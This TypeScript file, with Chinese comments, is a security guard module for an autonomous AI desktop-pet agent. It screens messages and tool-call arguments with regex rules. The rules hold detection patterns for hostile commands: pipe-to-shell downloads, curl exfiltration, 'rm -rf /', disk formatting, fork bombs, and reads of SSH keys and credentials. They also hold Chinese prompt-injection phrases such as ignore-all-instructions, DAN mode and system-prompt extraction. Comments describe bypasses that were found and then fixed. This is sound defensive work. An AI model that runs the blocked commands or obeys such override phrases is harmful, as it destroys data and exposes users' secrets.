// ============================================================
// securityGuard.ts — 消息/工具参数级安全审查 (v2.7)
//
// ⚠️ 与 sandboxRules.ts 的分工（不要混淆）：
//   - 本模块：审查 LLM 消息文本和工具调用参数（checkMessage / checkToolCall）
//   - sandboxRules.ts：审查即将执行的 shell 命令字符串（evaluateCommand）
//   两者互补，不重复。命令执行时先过 securityGuard 再过 sandboxRules。
//
// 借鉴 QwenPaw tool_guard:
//   旧 injectionGuard.ts: 二元开关 + 简单正则
//   新: 6 级严重度 × 10 类威胁 × 工具参数级审查
//
// 威胁分类 (借鉴 QwenPaw GuardThreatCategory):
//   COMMAND_INJECTION, PATH_TRAVERSAL, DATA_EXFILTRATION,
//   SENSITIVE_FILE_ACCESS, CREDENTIAL_EXPOSURE,
//   PROMPT_INJECTION, CODE_EXECUTION, PRIVILEGE_ESCALATION,
//   RESOURCE_ABUSE, NETWORK_ABUSE
//
// 安全响应:
//   SAFE → 放行
//   INFO → 放行 + 日志
//   LOW → 放行 + 日志 + 警告
//   MEDIUM → 审批流 (如果启用) 或 警告
//   HIGH → 审批流 / 用户确认
//   CRITICAL → 直接拒绝
// ============================================================

import type { LLMToolCall } from './tools/types'

// ═══════════════════════════════════════════════════════════
// 枚举
// ═══════════════════════════════════════════════════════════

export enum GuardSeverity {
  SAFE = 'SAFE',
  INFO = 'INFO',
  LOW = 'LOW',
  MEDIUM = 'MEDIUM',
  HIGH = 'HIGH',
  CRITICAL = 'CRITICAL',
}

export enum ThreatCategory {
  COMMAND_INJECTION = 'command_injection',
  PATH_TRAVERSAL = 'path_traversal',
  DATA_EXFILTRATION = 'data_exfiltration',
  SENSITIVE_FILE_ACCESS = 'sensitive_file_access',
  CREDENTIAL_EXPOSURE = 'credential_exposure',
  PROMPT_INJECTION = 'prompt_injection',
  CODE_EXECUTION = 'code_execution',
  PRIVILEGE_ESCALATION = 'privilege_escalation',
  RESOURCE_ABUSE = 'resource_abuse',
  NETWORK_ABUSE = 'network_abuse',
}

// ═══════════════════════════════════════════════════════════
// 类型
// ═══════════════════════════════════════════════════════════

export interface GuardRule {
  id: string
  name: string
  category: ThreatCategory
  severity: GuardSeverity
  description: string
  /** 适用的工具名 (为空表示所有工具) */
  tools?: string[]
  /** 检查的参数名 (为空表示所有参数) */
  params?: string[]
  /** 匹配模式 */
  pattern: RegExp
  /** 修复建议 */
  remediation: string
}

export interface GuardFinding {
  id: string
  ruleId: string
  category: ThreatCategory
  severity: GuardSeverity
  title: string
  description: string
  toolName: string
  paramName?: string
  matchedValue?: string
  snippet?: string
  remediation?: string
}

export interface GuardResult {
  allowed: boolean
  severity: GuardSeverity
  findings: GuardFinding[]
  requiresApproval: boolean
  summary: string
}

export interface GuardConfig {
  enabled: boolean
  /** 自动拦截 CRITICAL */
  blockCritical: boolean
  /** MEDIUM+ 需要审批 */
  requireApprovalForMedium: boolean
  /** HIGH+ 需要审批 */
  requireApprovalForHigh: boolean
  /** 记录所有检测 */
  logAll: boolean
  /** 最大消息长度 */
  maxMessageLength: number
}

// ═══════════════════════════════════════════════════════════
// 规则库
// ═══════════════════════════════════════════════════════════

const GUARD_RULES: GuardRule[] = [
  // ── COMMAND_INJECTION ──────────────────────────────

  {
    id: 'CMD-001',
    name: 'Shell 命令注入 — 管道链接',
    category: ThreatCategory.COMMAND_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '检测到利用管道链接执行多条命令',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /\|\s*(sh|bash|cmd|powershell|curl|wget|nc|telnet)/i,
    remediation: '移除管道链接中的外部命令调用',
  },
  {
    id: 'CMD-002',
    name: 'Shell 命令注入 — 命令替换',
    category: ThreatCategory.COMMAND_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '检测到命令替换语法 $() 或 ``',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /\$\(|`[^`]+`/,
    remediation: '使用安全的参数传递方式，避免命令替换',
  },
  {
    id: 'CMD-003',
    name: 'Shell 命令注入 — 重定向',
    category: ThreatCategory.COMMAND_INJECTION,
    severity: GuardSeverity.HIGH,
    description: '利用输出重定向覆盖系统文件',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: />\s*\/(etc|var|usr|sys|proc|dev)\//,
    remediation: '确认目标路径是否为合法用户文件',
  },

  // ── 🔧 2026-10-07 补：毁灭性删除 / 磁盘破坏 ────────────────
  //
  // 【为什么补】实测发现：`rm -rf /`、`format C:`、`del /f /s /q C:\` 全都返回
  //   `severity=SAFE` 放行。而护栏当时能拦住的是 `curl http://x.sh | bash`
  //   这类**注入型**命令 —— 也就是说：**防住了「别人塞进来的命令」，
  //   却没防住「模型自己写出来的毁灭性命令」**。
  //   对桌宠这种会自主执行命令的 Agent，后者才是更现实的威胁面。
  //
  // 【为什么是 CRITICAL】这三类操作的共同点是**不可逆**：
  //   删掉根目录/家目录、格式化盘符、覆写块设备 —— 没有「撤销」这个选项。
  //   按本文件既有的分级约定，CRITICAL 会被 blockCritical 直接拦截。
  //
  // 【刻意不收 `rm -rf ./build`】递归删除子目录是开发日常（清 node_modules、
  //   清构建产物），把它标成危险会让护栏变成噪音、用户学会无脑点「同意」，
  //   反而削弱真实告警。所以规则只锚定「根 / 家 / 盘符」这三种目标。
  {
    id: 'CMD-004',
    name: '毁灭性删除 — 根目录 / 家目录 / 盘符',
    category: ThreatCategory.COMMAND_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '递归强制删除根目录、家目录或整个盘符，会造成不可逆的数据丢失',
    tools: ['shell_exec'],
    params: ['command'],
    // 覆盖 rm -rf / · rm -rf /* · rm -rf ~ · rm -rf $HOME · rm -rf C: · del /f /s /q C:\
    pattern: /(?:^|[;&|]\s*|\s)(?:rm|rmdir|del)\s+(?:-[a-zA-Z]+\s+|\/[a-zA-Z]+\s+)*(?:\/|\/\*|~\/?|\$HOME|[A-Za-z]:[\\/]?)(?:\s|$|\*)/i,
    remediation: '拒绝执行。删除操作必须指定具体路径，且不得指向根目录、家目录或盘符。',
  },
  {
    id: 'CMD-005',
    name: '磁盘破坏 — 格式化 / 块设备覆写',
    category: ThreatCategory.COMMAND_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '格式化磁盘或直接向块设备写入数据',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /\b(?:format\s+[A-Za-z]:|mkfs(?:\.\w+)?\s|dd\b[^|;&]*\bof=\/dev\/|diskpart)/i,
    remediation: '拒绝执行。磁盘级操作必须由用户手动完成。',
  },

  // ── PATH_TRAVERSAL ─────────────────────────────────

  {
    id: 'PATH-001',
    name: '路径穿越 — 访问系统目录',
    category: ThreatCategory.PATH_TRAVERSAL,
    severity: GuardSeverity.CRITICAL,
    description: '尝试访问 Windows 系统目录',
    tools: ['file_read', 'file_write', 'file_edit', 'file_list', 'file_search'],
    params: ['file_path', 'path', 'rootDir'],
    // 🔧 2026-10-07 修复：原正则写作 /C:\\Windows\\System32|C:\\Windows\\SysWOW64/i，
    //   **只认反斜杠**。但 Windows 的 API 与 shell 都同时接受正斜杠，
    //   于是 `C:/Windows/System32/evil.dll` 这类写法**直接绕过护栏**
    //   （实测 severity=SAFE 放行）。现在两种分隔符都认，且允许混用。
    pattern: /C:[\\/]+Windows[\\/]+(?:System32|SysWOW64)/i,
    remediation: '拒绝访问系统关键目录。如需查看非系统文件，请指定更精确的目录。',
  },
  {
    id: 'PATH-003',
    name: '路径穿越 — 访问 Unix 系统目录',
    category: ThreatCategory.PATH_TRAVERSAL,
    severity: GuardSeverity.HIGH,
    description: '尝试写入 /etc、/boot、/usr/bin 等系统目录',
    tools: ['file_write', 'file_edit'],
    params: ['file_path', 'path'],
    pattern: /^\/(?:etc|boot|bin|sbin|usr\/bin|usr\/sbin|lib\/systemd)\//i,
    remediation: '系统目录不可写入。请改到用户目录下操作。',
  },
  {
    id: 'PATH-002',
    name: '路径穿越 — ../ 序列',
    category: ThreatCategory.PATH_TRAVERSAL,
    severity: GuardSeverity.HIGH,
    description: '使用 ../ 尝试穿越到上级目录',
    tools: ['file_read', 'file_write', 'file_edit'],
    params: ['file_path', 'path'],
    pattern: /(?:\.\.[\\/]){3,}/,
    remediation: '限制文件操作在工作区内',
  },

  // ── FILE_SEARCH / DISK_LIST (v3.6) ─────────────────

  {
    id: 'FS-001',
    name: '文件搜索 — 读取敏感文件',
    category: ThreatCategory.DATA_EXFILTRATION,
    severity: GuardSeverity.MEDIUM,
    description: '全局文件搜索匹配到了密钥/凭证类文件',
    tools: ['file_search'],
    params: ['pattern'],
    pattern: /\.(env|pem|key|p12|pfx|credentials|secret|token|password|private)\b/i,
    remediation: '搜索敏感文件仅返回路径信息，不会读取内容。如需读取需单独审批。',
  },
  {
    id: 'FS-002',
    name: '文件搜索 — 全盘扫描',
    category: ThreatCategory.RESOURCE_ABUSE,
    severity: GuardSeverity.LOW,
    description: '全局文件搜索（全盘扫描）可能消耗较多系统资源',
    tools: ['file_search'],
    params: ['rootDir'],
    pattern: /^$/,  // rootDir 为空 → 全盘扫描
    remediation: '全盘搜索是安全的只读操作，但可能较慢。如需提速请指定 rootDir。',
  },

  // ── DATA_EXFILTRATION ──────────────────────────────

  {
    id: 'DATA-001',
    name: '数据外泄 — 敏感文件读取',
    category: ThreatCategory.DATA_EXFILTRATION,
    severity: GuardSeverity.HIGH,
    description: '尝试读取包含敏感信息的文件',
    tools: ['file_read', 'file_search'],
    params: ['file_path', 'pattern'],
    pattern: /\.(env|pem|key|p12|pfx|credentials|secret|token|password)\b/i,
    remediation: '拒绝读取凭证和密钥文件。file_search 可以列出但不可读取内容。',
  },
  {
    id: 'DATA-002',
    name: '数据外泄 — 网络发送',
    category: ThreatCategory.DATA_EXFILTRATION,
    severity: GuardSeverity.CRITICAL,
    description: '通过 shell 命令发送数据到外部',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /curl\s+.*\s+-[dF].*\s+https?:\/\//i,
    remediation: '此操作需要审批',
  },

  // ── SENSITIVE_FILE_ACCESS ──────────────────────────

  {
    id: 'SENS-001',
    name: '敏感文件 — SSH 密钥',
    category: ThreatCategory.SENSITIVE_FILE_ACCESS,
    severity: GuardSeverity.HIGH,
    description: '尝试访问 SSH 密钥文件',
    tools: ['file_read', 'file_write', 'file_edit'],
    params: ['file_path', 'path'],
    pattern: /\.ssh[\\/]|id_rsa|id_ed25519|authorized_keys/i,
    remediation: 'SSH 密钥访问需审批',
  },
  {
    id: 'SENS-002',
    name: '敏感文件 — 浏览器数据',
    category: ThreatCategory.SENSITIVE_FILE_ACCESS,
    severity: GuardSeverity.MEDIUM,
    description: '尝试访问浏览器数据目录',
    tools: ['file_read'],
    params: ['file_path', 'path'],
    pattern: /AppData[\\/](Local|Roaming)[\\/](Google|Mozilla|Microsoft|Brave|Opera)/i,
    remediation: '此操作需要用户确认',
  },

  // ── CREDENTIAL_EXPOSURE ────────────────────────────

  {
    id: 'CRED-001',
    name: '凭证暴露 — 环境变量',
    category: ThreatCategory.CREDENTIAL_EXPOSURE,
    severity: GuardSeverity.MEDIUM,
    description: '尝试读取环境变量 (可能包含 API Key)',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /(?:echo|printenv|cat)\s+\$?(?:API_KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)/i,
    remediation: '使用安全的凭证管理方式',
  },
  {
    id: 'CRED-002',
    name: '凭证暴露 — 注册表',
    category: ThreatCategory.CREDENTIAL_EXPOSURE,
    severity: GuardSeverity.HIGH,
    description: '尝试读取 Windows 注册表凭证',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /reg\s+query\s+.*(?:password|credential|token)/i,
    remediation: '注册表凭证访问需审批',
  },

  // ── PROMPT_INJECTION ───────────────────────────────

  {
    id: 'PROMPT-001',
    name: '提示注入 — 角色越狱',
    category: ThreatCategory.PROMPT_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '尝试让 AI 忽略角色设定',
    tools: [],
    params: [],
    pattern: /忽略(所有|一切|之前|上面|以下|上述).{0,20}(指令|规则|限制|设定|角色|人设)/i,
    remediation: '角色设定不可被覆盖',
  },
  {
    id: 'PROMPT-002',
    name: '提示注入 — 身份篡改',
    category: ThreatCategory.PROMPT_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '尝试让 AI 改变身份',
    tools: [],
    params: [],
    pattern: /你(现在|从现在开始|以后).{0,20}(不是|不再是|忘记).{0,15}(AI|助手|Lumina|机器人)/i,
    remediation: '身份不可被篡改',
  },
  {
    id: 'PROMPT-003',
    name: '提示注入 — 系统提示词窃取',
    category: ThreatCategory.PROMPT_INJECTION,
    severity: GuardSeverity.HIGH,
    description: '尝试获取内部指令',
    tools: [],
    params: [],
    pattern: /(显示|输出|打印|告诉我|重复).{0,30}(系统提示|system\s*prompt|你的指令|你的设定)/i,
    remediation: '系统提示词不对外暴露',
  },
  {
    id: 'PROMPT-004',
    name: '提示注入 — DAN 模式',
    category: ThreatCategory.PROMPT_INJECTION,
    severity: GuardSeverity.CRITICAL,
    description: '已知越狱攻击模式',
    tools: [],
    params: [],
    pattern: /DAN\s*(模式|mode)|do\s*anything\s*now|作为\s*(DAN|开发者|系统管理员|root)/i,
    remediation: '拒绝已知越狱模式',
  },

  // ── CODE_EXECUTION ─────────────────────────────────

  {
    id: 'CODE-001',
    name: '代码执行 — 动态 eval',
    category: ThreatCategory.CODE_EXECUTION,
    severity: GuardSeverity.HIGH,
    description: '尝试通过 shell 执行动态代码',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /python\s+-(c|m)\s|node\s+-e\s|eval\s|exec\s*\(/i,
    remediation: '动态代码执行需审批',
  },
  {
    id: 'CODE-002',
    name: '代码执行 — 下载并执行',
    category: ThreatCategory.CODE_EXECUTION,
    severity: GuardSeverity.CRITICAL,
    description: '下载远程脚本并执行',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /(curl|wget|Invoke-WebRequest).{0,50}\|\s*(sh|bash|python|node|powershell)/i,
    remediation: '拒绝下载并执行远程代码',
  },

  // ── RESOURCE_ABUSE ─────────────────────────────────

  {
    id: 'RES-001',
    name: '资源滥用 — 无限循环',
    category: ThreatCategory.RESOURCE_ABUSE,
    severity: GuardSeverity.MEDIUM,
    description: '检测到可能的无限循环命令',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /while\s+true|for\s*\(\s*;\s*;\s*\)|:loop|goto\s+loop/i,
    remediation: '确保有合理的终止条件',
  },
  {
    id: 'RES-002',
    name: '资源滥用 — fork 炸弹',
    category: ThreatCategory.RESOURCE_ABUSE,
    severity: GuardSeverity.CRITICAL,
    description: '检测到 fork 炸弹模式',
    tools: ['shell_exec'],
    params: ['command'],
    pattern: /:\s*\(\)\s*\{|fork\s*bomb|%0\|%0/,
    remediation: '直接拒绝执行',
  },
]

// ═══════════════════════════════════════════════════════════
// SecurityGuard
// ═══════════════════════════════════════════════════════════

export class SecurityGuard {
  private config: GuardConfig
  private auditLog: GuardFinding[] = []

  constructor(config?: Partial<GuardConfig>) {
    this.config = {
      enabled: config?.enabled ?? true,
      blockCritical: config?.blockCritical ?? true,
      requireApprovalForMedium: config?.requireApprovalForMedium ?? false,
      requireApprovalForHigh: config?.requireApprovalForHigh ?? true,
      logAll: config?.logAll ?? true,
      maxMessageLength: config?.maxMessageLength ?? 50000,
    }
  }

  // ── 检查消息内容 (prompt injection) ────────────────

  checkMessage(text: string): GuardResult {
    if (!this.config.enabled) {
      return { allowed: true, severity: GuardSeverity.SAFE, findings: [], requiresApproval: false, summary: '安全检查已禁用' }
    }

    // 长度检查
    if (text.length > this.config.maxMessageLength) {
      return {
        allowed: false,
        severity: GuardSeverity.LOW,
        findings: [],
        requiresApproval: false,
        summary: `消息过长 (${text.length} > ${this.config.maxMessageLength})`,
      }
    }

    const findings: GuardFinding[] = []

    // 仅检查 PROMPT_INJECTION 类型的规则（无工具限制的）
    for (const rule of GUARD_RULES) {
      if (rule.tools && rule.tools.length > 0) {continue}

      if (rule.pattern.test(text)) {
        findings.push({
          id: `${rule.id}-${Date.now()}`,
          ruleId: rule.id,
          category: rule.category,
          severity: rule.severity,
          title: rule.name,
          description: rule.description,
          toolName: 'message',
          snippet: text.slice(0, 200),
          remediation: rule.remediation,
        })
      }
    }

    return this.evaluateResult(findings)
  }

  // ── 检查工具调用参数 ───────────────────────────────

  checkToolCall(toolCall: LLMToolCall): GuardResult {
    if (!this.config.enabled) {
      return { allowed: true, severity: GuardSeverity.SAFE, findings: [], requiresApproval: false, summary: '安全检查已禁用' }
    }

    const toolName = toolCall.function.name
    let args: Record<string, any> = {}
    try {
      args = JSON.parse(toolCall.function.arguments)
    } catch {
      // 🔧 P0 修复（fail-open → fail-closed）
      //
      // 旧实现：参数解析失败就 allowed:true 放行，理由是「后续 LLM 会处理」。
      // 这个理由站不住：**LLM 恰恰是最不该被信任来处理非法输入的一方**，
      // 而安全审查恰恰是**唯一**不该失效的环节。
      //
      // 为什么这条路径值得关注：
      //   攻击者可以把恶意 payload 藏在**非法 JSON** 里，例如：
      //     {"cmd":"rm -rf /",     ← 截断的坏 JSON
      //   JSON.parse 直接失败 → 规则检查全部跳过 → 放行。
      //   也就是说「让检查失败」反而成了绕过检查的手段——典型 fail-open。
      //
      // 实际风险边界（避免过度声称）：
      //   执行层 tools/registry.ts 对解析失败是 args = {},
      //   所以坏 JSON 里的命令**不会**真的被执行。
      //   但仍有两个真问题：
      //     ① 工具会带着**空参数**执行，可能产生意外副作用
      //     ② 安全审查静默失效，用户和开发者都无从察觉
      //
      // 修法：fail-closed —— 参数无法解析就是「无法审查」，
      // 无法审查时必须停下来让用户决定，而不是默认放行。
      return {
        allowed: false,
        severity: GuardSeverity.HIGH,
        findings: [{
          id: 'GUARD-BADJSON-001',
          ruleId: 'GUARD-BADJSON',
          category: ThreatCategory.COMMAND_INJECTION,
          severity: GuardSeverity.HIGH,
          title: '工具参数不是合法 JSON',
          description: `${toolName} 的参数无法解析为 JSON，安全审查无法进行。`
            + '这可能是模型输出异常，也可能是构造的绕过尝试。已拒绝执行。',
          toolName,
          remediation: '请让模型重新生成合法 JSON 参数；确认无误后可再次执行。',
        }],
        requiresApproval: true,
        summary: `${toolName} 的参数不是合法 JSON，无法完成安全审查，已拦截`,
      }
    }

    const findings: GuardFinding[] = []

    for (const rule of GUARD_RULES) {
      // 工具过滤
      if (rule.tools && rule.tools.length > 0 && !rule.tools.includes(toolName)) {continue}

      // 检查参数
      const paramsToCheck = rule.params && rule.params.length > 0
        ? rule.params
        : Object.keys(args)

      for (const paramName of paramsToCheck) {
        const paramValue = args[paramName]
        if (typeof paramValue !== 'string') {continue}

        if (rule.pattern.test(paramValue)) {
          findings.push({
            id: `${rule.id}-${Date.now()}-${paramName}`,
            ruleId: rule.id,
            category: rule.category,
            severity: rule.severity,
            title: rule.name,
            description: rule.description,
            toolName,
            paramName,
            matchedValue: paramValue.slice(0, 100),
            snippet: paramValue.slice(0, 200),
            remediation: rule.remediation,
          })
        }
      }
    }

    return this.evaluateResult(findings)
  }

  // ── 评估结果 ───────────────────────────────────────

  private evaluateResult(findings: GuardFinding[]): GuardResult {
    if (findings.length === 0) {
      return {
        allowed: true,
        severity: GuardSeverity.SAFE,
        findings: [],
        requiresApproval: false,
        summary: '通过安全检查',
      }
    }

    // 确定最高严重度
    const severityOrder = [GuardSeverity.SAFE, GuardSeverity.INFO, GuardSeverity.LOW, GuardSeverity.MEDIUM, GuardSeverity.HIGH, GuardSeverity.CRITICAL]
    const maxSeverity = findings.reduce((max, f) => {
      const currentIdx = severityOrder.indexOf(f.severity)
      const maxIdx = severityOrder.indexOf(max)
      return currentIdx > maxIdx ? f.severity : max
    }, GuardSeverity.SAFE)

    // 记录审计日志
    if (this.config.logAll) {
      this.auditLog.push(...findings)
    }

    // 决定行动
    let allowed = true
    let requiresApproval = false
    const criticalFindings = findings.filter(f => f.severity === GuardSeverity.CRITICAL)
    const highFindings = findings.filter(f => f.severity === GuardSeverity.HIGH)
    const mediumFindings = findings.filter(f => f.severity === GuardSeverity.MEDIUM)

    if (this.config.blockCritical && criticalFindings.length > 0) {
      allowed = false
    }
    if (this.config.requireApprovalForHigh && highFindings.length > 0) {
      requiresApproval = true
    }
    if (this.config.requireApprovalForMedium && mediumFindings.length > 0) {
      requiresApproval = true
    }

    return {
      allowed,
      severity: maxSeverity,
      findings,
      requiresApproval,
      summary: this.buildSummary(findings, maxSeverity, allowed, requiresApproval),
    }
  }

  // ── 生成摘要 ───────────────────────────────────────

  private buildSummary(findings: GuardFinding[], maxSeverity: GuardSeverity, allowed: boolean, requiresApproval: boolean): string {
    const parts: string[] = []

    if (!allowed) {
      parts.push(`🔴 已阻止 — 检测到 ${findings.length} 个安全问题（最高严重度: ${maxSeverity}）`)
    } else if (requiresApproval) {
      parts.push(`🟡 需审批 — 检测到 ${findings.length} 个安全问题（最高严重度: ${maxSeverity}）`)
    } else {
      parts.push(`🟢 已放行 — 检测到 ${findings.length} 个低风险问题（最高严重度: ${maxSeverity}）`)
    }

    // 按类别分组
    const byCategory = new Map<string, GuardFinding[]>()
    for (const f of findings) {
      const key = f.category
      if (!byCategory.has(key)) {byCategory.set(key, [])}
      byCategory.get(key)!.push(f)
    }

    for (const [category, catFindings] of byCategory) {
      const catName = this.categoryLabel(category)
      parts.push(`\n  ${catName}: ${catFindings.map(f => f.title).join('; ')}`)
    }

    return parts.join('')
  }

  private categoryLabel(category: string): string {
    const labels: Record<string, string> = {
      command_injection: '💉 命令注入',
      path_traversal: '📁 路径穿越',
      data_exfiltration: '📤 数据外泄',
      sensitive_file_access: '🔐 敏感文件',
      credential_exposure: '🔑 凭证暴露',
      prompt_injection: '🧠 提示注入',
      code_execution: '⚡ 代码执行',
      privilege_escalation: '👑 权限提升',
      resource_abuse: '💣 资源滥用',
      network_abuse: '🌐 网络滥用',
    }
    return labels[category] || category
  }

  // ── 获取审计日志 ───────────────────────────────────

  getAuditLog(limit?: number): GuardFinding[] {
    if (limit) {return this.auditLog.slice(-limit)}
    return [...this.auditLog]
  }

  clearAuditLog(): void {
    this.auditLog = []
  }

  // ── 更新配置 ───────────────────────────────────────

  updateConfig(config: Partial<GuardConfig>): void {
    this.config = { ...this.config, ...config }
  }

  getConfig(): GuardConfig {
    return { ...this.config }
  }
}

// ═══════════════════════════════════════════════════════════
// 全局单例
// ═══════════════════════════════════════════════════════════

let globalSecurityGuard: SecurityGuard | null = null

export function getSecurityGuard(): SecurityGuard {
  if (!globalSecurityGuard) {
    globalSecurityGuard = new SecurityGuard()
  }
  return globalSecurityGuard
}

export function initSecurityGuard(config?: Partial<GuardConfig>): SecurityGuard {
  globalSecurityGuard = new SecurityGuard(config)
  return globalSecurityGuard
}
